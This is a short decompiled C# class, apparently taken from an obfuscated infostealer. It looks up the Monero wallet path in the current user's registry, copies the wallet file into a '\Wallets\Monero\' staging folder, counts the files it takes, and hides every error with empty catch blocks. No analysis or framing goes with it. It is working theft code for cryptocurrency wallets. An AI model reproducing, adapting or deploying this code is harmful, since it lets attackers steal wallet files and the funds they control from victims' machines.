using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000063 RID: 99
internal class Class36
{
	// Token: 0x0600025D RID: 605 RVA: 0x00012FB8 File Offset: 0x000111B8
	public static void smethod_0(string string_1)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
			{
				try
				{
					Directory.CreateDirectory(string_1 + Class36.string_0);
					string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
					Directory.CreateDirectory(string_1 + Class36.string_0);
					File.Copy(text, string_1 + Class36.string_0 + text.Split(new char[]
					{
						'\\'
					})[text.Split(new char[]
					{
						'\\'
					}).Length - 1]);
					Class36.int_0++;
					Class37.int_0++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600025E RID: 606 RVA: 0x0000446C File Offset: 0x0000266C
	public Class36()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0600025F RID: 607 RVA: 0x000052E4 File Offset: 0x000034E4
	// Note: this type is marked as 'beforefieldinit'.
	static Class36()
	{
		Class40.gcO0h7LzslQIW();
		Class36.int_0 = 0;
		Class36.string_0 = "\\Wallets\\Monero\\";
	}

	// Token: 0x04000115 RID: 277
	public static int int_0;

	// Token: 0x04000116 RID: 278
	public static string string_0;
}
